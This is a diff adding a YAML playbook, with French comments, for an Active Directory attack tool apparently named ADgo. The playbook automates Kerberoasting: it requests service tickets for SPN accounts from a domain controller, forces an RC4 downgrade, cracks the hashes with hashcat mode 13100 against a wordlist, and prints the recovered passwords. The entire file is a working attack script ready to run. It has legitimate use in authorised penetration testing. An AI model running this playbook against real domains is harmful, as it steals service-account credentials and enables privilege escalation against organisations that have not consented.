@@ -1,0 +1,58 @@
+# ADgo Playbook — Kerberoast + Crack
+# ============================================================
+# Kerberoaste les comptes SPN puis lance hashcat automatiquement.
+#
+# Usage :
+#   adgo playbook run kerberoast-crack.yaml \
+#     -v DC_IP=192.168.1.10 DOMAIN=lab.local USERNAME=admin PASSWORD=pass \
+#        WORDLIST=/usr/share/wordlists/rockyou.txt
+
+id: kerberoast-crack
+name: Kerberoast + Crack
+description: Kerberoast SPN accounts, force RC4, then crack with hashcat
+author: adgo
+tags: [kerberos, kerberoast, crack, hashcat]
+version: "1.0"
+
+env:
+  dc_ip: "{{DC_IP}}"
+  domain: "{{DOMAIN}}"
+  username: "{{USERNAME}}"
+  password: "{{PASSWORD}}"
+  wordlist: "{{WORDLIST}}"
+  output_dir: "./kerberoast_{{domain}}"
+
+steps:
+  - id: kerberoast
+    name: Kerberoast with RC4 downgrade
+    type: adgo
+    command: kerberos kerberoast
+    args:
+      dc-ip: "{{dc_ip}}"
+      username: "{{username}}"
+      password: "{{password}}"
+      domain: "{{domain}}"
+      force-rc4: "true"
+      analyze: "true"
+      output: "{{output_dir}}/hashes.txt"
+    on_failure: stop
+
+  - id: check-hashes
+    name: Check hash file exists
+    type: condition
+    condition: "{{output_dir}}/hashes.txt contains $krb5tgs"
+    on_failure: stop
+
+  - id: crack-rc4
+    name: Crack RC4 hashes with hashcat
+    description: Mode 13100 (RC4) — fastest
+    type: shell
+    command: hashcat -m 13100 "{{output_dir}}/hashes.txt" "{{wordlist}}" --force -o "{{output_dir}}/cracked.txt"
+    timeout: 3600
+    on_failure: continue
+
+  - id: show-cracked
+    name: Show cracked passwords
+    type: shell
+    command: cat "{{output_dir}}/cracked.txt"
+    on_failure: continue
